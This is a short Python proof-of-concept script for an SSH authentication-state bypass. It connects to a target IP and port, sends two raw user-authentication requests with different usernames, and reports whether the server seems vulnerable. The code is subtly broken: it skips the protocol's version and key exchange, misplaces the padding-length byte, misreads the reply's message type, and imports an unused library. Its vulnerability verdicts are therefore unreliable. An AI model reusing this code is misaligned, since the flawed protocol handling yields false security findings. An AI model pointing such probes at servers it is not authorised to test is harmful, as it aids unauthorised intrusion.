#!/usr/bin/env python3
import paramiko
import socket
import struct
import sys

def send_ssh_message(sock, msg_type, user, service, method):
    """
    Crafts and sends an SSH_MSG_USERAUTH_REQUEST message.
    """
    # SSH message format: length (4 bytes) + payload
    payload = struct.pack('!B', msg_type)  # SSH_MSG_USERAUTH_REQUEST = 50
    payload += struct.pack('!I', len(user)) + user.encode('utf-8')
    payload += struct.pack('!I', len(service)) + service.encode('ascii')
    payload += struct.pack('!I', len(method)) + method.encode('ascii')
    
    # Add padding to make the message length a multiple of 8 (SSH requirement)
    padding_length = 8 - (len(payload) % 8)
    payload += bytes([padding_length]) + bytes(padding_length - 1)
    
    # Prepend message length
    message = struct.pack('!I', len(payload)) + payload
    sock.sendall(message)

def receive_ssh_message(sock):
    """
    Receives and parses an SSH message.
    """
    length_data = sock.recv(4)
    if not length_data:
        return None
    length = struct.unpack('!I', length_data)[0]
    payload = b''
    while len(payload) < length:
        chunk = sock.recv(length - len(payload))
        if not chunk:
            break
        payload += chunk
    return payload

def main():
    if len(sys.argv) != 3:
        print("Usage: python poc_authentication_state_flush_bypass.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        
        # Send initial SSH_MSG_USERAUTH_REQUEST with a valid username
        send_ssh_message(sock, 50, 'valid_user', 'ssh-connection', 'password')
        response = receive_ssh_message(sock)
        print(f"Initial response: {response}")
        
        # Send a second SSH_MSG_USERAUTH_REQUEST with a different username
        # This should trigger the server to flush authentication states if compliant
        send_ssh_message(sock, 50, 'different_user', 'ssh-connection', 'password')
        response = receive_ssh_message(sock)
        print(f"Response after username change: {response}")
        
        # Analyze the response to determine if the server properly flushed the state
        if response and response[0] == 51:  # SSH_MSG_USERAUTH_FAILURE
            print("Server properly flushed authentication state and rejected the request.")
        else:
            print("Server may be vulnerable: Authentication state was not properly flushed.")
        
        sock.close()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()